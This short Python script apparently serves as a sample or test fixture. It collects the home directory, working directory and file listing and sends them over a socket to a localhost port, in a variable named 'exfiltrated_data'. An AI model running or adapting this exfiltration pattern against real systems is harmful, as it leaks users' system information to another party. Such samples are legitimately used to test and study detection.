import socket, os
s = socket.socket()
s.connect(('127.0.0.1',8080))
exfiltrated_data = ",".join([
    os.environ.get("HOME","home unknown"),
    os.getcwd()] +
    os.listdir("."))
s.send(exfiltrated_data.encode())
s.close()
